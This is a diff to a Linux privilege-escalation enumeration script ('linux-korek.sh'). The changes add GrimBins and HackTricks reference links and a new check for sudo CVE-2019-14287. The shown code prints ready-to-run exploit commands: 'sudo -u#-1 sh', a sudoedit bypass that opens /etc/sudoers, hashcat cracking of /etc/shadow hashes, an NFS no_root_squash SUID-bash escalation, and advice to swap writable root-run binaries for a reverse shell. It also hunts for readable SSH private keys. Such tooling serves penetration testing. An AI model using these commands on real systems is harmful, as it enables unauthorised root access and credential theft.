@@ -24,6 +24,7 @@ gtfo()   { echo -e "    ${Y}[GTFOBins]${N} https://gtfobins.github.io/gtfobins/$
 
 echo -e "${C}================================================${N}"
 echo -e "${C}  linux-korek.sh - linPEAS Gap Filler${N}"
+echo -e "${C}  Refs: GTFOBins + HackTricks + GrimBins${N}"
 [ $FULL -eq 0 ] && echo -e "${Y}  QUICK MODE - run --full for complete scan${N}"
 [ $FULL -eq 1 ] && echo -e "${G}  FULL MODE${N}"
 echo -e "${C}================================================${N}"
@@ -232,12 +233,24 @@ done
 
 # 7. Sudo version CVE check (no password needed)
 sec "SUDO CVE CHECK"
+# ref: https://grimbins.github.io/grimbins/sudo/
 sudo_ver=$(sudo -V 2>/dev/null | grep "Sudo version" | awk '{print $3}')
-[ -n "$sudo_ver" ] && info "Sudo version: $sudo_ver"
-echo "$sudo_ver" | grep -qE "^1\.[0-8]\.|^1\.9\.(0|1|2|3|4|5|6|7|8|9|10|11|12p1)" && \
-    hot "Sudo $sudo_ver vulnerable to CVE-2023-22809 (sudoedit bypass)!" && \
-    exploit "SUDO_EDITOR='vim -- /etc/sudoers' sudoedit /etc/hosts"
+if [ -n "$sudo_ver" ]; then
+    info "Sudo version: $sudo_ver"
+
+    # CVE-2019-14287 - sudo < 1.8.28 - bypass with -u#-1
+    echo "$sudo_ver" | grep -qE "^1\.[0-7]\.|^1\.8\.([0-9]|1[0-9]|2[0-7])$" && \
+        hot "Sudo $sudo_ver vulnerable to CVE-2019-14287!" && \
+        exploit "sudo -u#-1 sh" && \
+        exploit "If allowed to run ANY command as ANY user: sudo -u#-1 /bin/bash"
+
+    # CVE-2023-22809 - sudo < 1.9.12p2 - sudoedit bypass
+    echo "$sudo_ver" | grep -qE "^1\.[0-8]\.|^1\.9\.(0|1|2|3|4|5|6|7|8|9|10|11|12p1)$" && \
+        hot "Sudo $sudo_ver vulnerable to CVE-2023-22809 (sudoedit bypass)!" && \
+        exploit "SUDO_EDITOR='vim -- /etc/sudoers' sudoedit /etc/hosts"
+fi
 info "Check sudo perms manually if you have password: sudo -l"
+info "GrimBins sudo ref: https://grimbins.github.io/grimbins/sudo/"
 
 # 8. Shell history cred grep
 sec "SHELL HISTORY CREDENTIALS"
@@ -260,6 +273,7 @@ if [ -r /etc/shadow ] 2>/dev/null; then
         exploit "hashcat -m 1800 shadow.txt rockyou.txt  (sha512crypt \$6\$)"
         exploit "hashcat -m 500  shadow.txt rockyou.txt  (md5crypt \$1\$)"
         exploit "hashcat -m 3200 shadow.txt rockyou.txt  (bcrypt \$2y\$)"
+        info "hashcat ref: https://grimbins.github.io/grimbins/hashcat/"
     fi
 fi
 
@@ -303,6 +317,7 @@ grep "no_root_squash" /etc/exports 2>/dev/null | while read l; do
     exploit "On Kali: mkdir /tmp/nfs && mount -t nfs TARGET:$share /tmp/nfs"
     exploit "cp /bin/bash /tmp/nfs/ && chmod +s /tmp/nfs/bash"
     exploit "On target: $share/bash -p"
+    info "nc reverse shell ref: https://grimbins.github.io/grimbins/nc/"
 done
 
 # 12. Interesting files
@@ -320,10 +335,18 @@ done
 # ===========================================================
 # FULL MODE ONLY
 # ===========================================================
+# grimbins refs for attacker side tools (run on Kali after findings)
+# nc shells    : https://grimbins.github.io/grimbins/nc/
+# ssh keys     : https://grimbins.github.io/grimbins/ssh/
+# msfvenom     : https://grimbins.github.io/grimbins/msfvenom/
+# hashcat      : https://grimbins.github.io/grimbins/hashcat/
+# pspy         : https://grimbins.github.io/grimbins/pspy/
+
 if [ $FULL -eq 1 ]; then
 
 # 13. Process monitoring
 sec "PROCESS MONITORING - 60 seconds"
+# ref: https://grimbins.github.io/grimbins/pspy/
 warn "Watching for new root processes..."
 warn "When you see a root process - check if its binary/script is writable"
 warn "If writable: replace with reverse shell, wait for re-execution = root"
@@ -421,6 +444,7 @@ done
 
 # 19. SSH private keys
 sec "SSH PRIVATE KEYS"
+# ref: https://grimbins.github.io/grimbins/ssh/
 find / -maxdepth 8 \( -name "id_rsa" -o -name "id_dsa" -o \
     -name "id_ed25519" -o -name "*.pem" \) -readable -type f 2>/dev/null | \
 grep -vE "(/usr/share|/usr/lib|linux-korek)" | while read f; do
@@ -464,5 +488,9 @@ echo -e "    ${Y}[!]${N}  = Warning"
 echo -e "    ${G}[+]${N}  = Information"
 echo -e "    ${Y}[EXPLOIT]${N} = How to exploit"
 echo -e "    ${Y}[GTFOBins]${N} = GTFOBins reference"
+echo -e "\n${C}References:${N}"
+echo -e "  GTFOBins : https://gtfobins.github.io"
+echo -e "  GrimBins : https://grimbins.github.io"
+echo -e "  HackTricks: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation"
 [ $FULL -eq 0 ] && \
     echo -e "\n${Y}Tip: Run './linux-korek.sh --full' for complete scan + process monitoring${N}"
